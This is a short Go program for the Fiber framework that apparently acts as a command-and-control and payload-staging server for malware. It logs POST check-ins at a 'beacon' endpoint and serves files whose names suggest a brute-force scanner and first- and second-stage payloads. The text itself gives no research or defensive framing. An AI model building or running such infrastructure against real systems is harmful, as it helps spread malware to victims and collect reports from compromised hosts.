package main

import (
	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/log"
	"os"
)

func main() {
	app := fiber.New()

	app.Post("/lw-beacon", func(c *fiber.Ctx) error {
		log.Infof("Hit API Beacon URL with body %s", c.Body())
		return c.JSON(fiber.Map{"status": "ok"})
	})

	app.Get("/bin/:filename", func(c *fiber.Ctx) error {
		validFiles := []string{
			"lw-scan-brute",
			"lw-stage-1",
			"lw-stage-2",
		}

		filename := c.Params("filename")
		for _, file := range validFiles {
			if filename == file {
				log.Infof("Sending file %s", filename)
				dir, _ := os.Getwd()
				return c.SendFile(dir + "/bin/" + filename)
			}
		}
		log.Errorf("Invalid filename %s", filename)
		return c.SendStatus(fiber.StatusNotFound)

	})
	_ = app.Listen(":8080")
}
